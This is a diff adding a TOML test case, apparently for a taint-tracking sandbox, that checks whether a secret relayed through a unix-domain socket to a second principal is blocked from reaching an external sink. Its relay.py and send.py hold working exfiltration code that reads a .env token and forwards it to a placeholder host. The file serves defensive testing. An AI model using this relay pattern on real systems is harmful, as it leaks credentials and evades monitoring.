@@ -1,0 +1,57 @@
+# Shell 1 (a different principal) runs a relay on a unix-domain socket that
+# forwards to the external sink. Shell 0 reads the secret and writes it to the
+# unix socket -- a peer `recommended` permits. Shell 0's contact hands its
+# taint to the principal holding the bound socket, so the relay's forward to
+# the external sink must be refused. The socket lives outside the source: each
+# shell's work view is private.
+name = "proxy-via-unix"
+kind = "attack"
+policy = "recommended"
+# No shared `principal`: the relay is a separate principal from the reader.
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "relay.py"
+contents = """
+import os, socket
+path = "/tmp/marsh-leak-relay.sock"
+try:
+    os.unlink(path)
+except FileNotFoundError:
+    pass
+srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+srv.bind(path)
+srv.listen(1)
+conn, _ = srv.accept()
+data = conn.recv(65536)
+out = socket.socket()
+out.connect(("{SINK_HOST}", {SINK_PORT}))
+out.sendall(data)
+"""
+
+[[files]]
+path = "send.py"
+contents = """
+import socket, time
+secret = open(".env", "rb").read()
+time.sleep(0.5)
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/tmp/marsh-leak-relay.sock")
+s.sendall(secret)
+"""
+
+[[steps]]
+shell = 1
+run = "python3 relay.py &"
+expect = "accepted"
+
+[[steps]]
+shell = 0
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
